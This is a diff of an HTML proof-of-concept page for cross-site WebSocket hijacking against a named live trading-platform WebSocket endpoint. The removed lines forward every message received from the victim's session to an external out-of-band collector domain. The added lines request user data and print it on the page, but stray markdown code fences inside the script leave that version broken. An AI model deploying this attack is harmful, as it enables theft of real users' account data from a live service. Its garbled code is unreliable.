@@ -1,59 +1,44 @@
 <!DOCTYPE html>
+
 <html>
 <head>
-  <meta charset="utf-8">
-  <title>CSWSH PoC – GET Forward</title>
-  <style>
-    body { font-family: monospace; background:#111; color:#eee; }
-    pre  { white-space: pre-wrap; word-wrap: break-word; }
-  </style>
+    <title>CSWSH PoC</title>
 </head>
 <body>
 <script>
-  /* 1️⃣  Connect to the Deriv websocket */
-  const ws = new WebSocket("wss://mt5-real01-web-svg.deriv.com/terminal");
+let ws = new WebSocket("wss://mt5-real01-web-svg.deriv.com/terminal");
 
-  ws.onopen = () => {
-    console.log("[+] Connected to WebSocket");
-    /* 2️⃣  Send the exact payload you observed */
-    ws.send(JSON.stringify({ time: 1 }));
-  };
+ws.onopen = () => {
+console.log("[+] Connected to WebSocket");
 
-  /* 3️⃣  When a message arrives … */
-  ws.onmessage = async (event) => {
-    console.log("[+] Received data:", event.data);
+```
+// Replace with real message observed from target
+ws.send(JSON.stringify({
+    action: "get_user_data"
+}));
+```
 
-    /* 4️⃣  Build the query string to forward */
-    const params = new URLSearchParams({
-      time: 1,
-      req_id: 1,
-      raw: event.data           // raw payload is URL‑encoded automatically
-    });
+};
 
-    /* 5️⃣  Send a GET request to the target */
-    try {
-      const url = `http://gznjhjgiugzghjjxnrzddbemtwqm4ngho.oast.fun/receive?${params.toString()}`;
-      const response = await fetch(url, { method: "GET" });
+ws.onmessage = (event) => {
+console.log("[+] Received data:", event.data);
 
-      if (!response.ok) throw new Error(`HTTP ${response.status}`);
-      console.log("[+] Forwarded to example.com via GET");
-    } catch (err) {
-      console.error("[!] Error forwarding data:", err);
-    }
+```
+// Display on page (better for PoC visibility)
+let pre = document.createElement("pre");
+pre.textContent = event.data;
+document.body.appendChild(pre);
+```
 
-    /* 6️⃣  Keep the PoC visual on the page (optional) */
-    const pre = document.createElement("pre");
-    pre.textContent = event.data;
-    document.body.appendChild(pre);
-  };
+};
 
-  ws.onerror = (err) => {
-    console.log("[!] Error:", err);
-  };
+ws.onerror = (err) => {
+console.log("[!] Error:", err);
+};
 
-  ws.onclose = () => {
-    console.log("[-] Connection closed");
-  };
-</script>
+ws.onclose = () => {
+console.log("[-] Connection closed");
+}; </script>
+
 </body>
 </html>
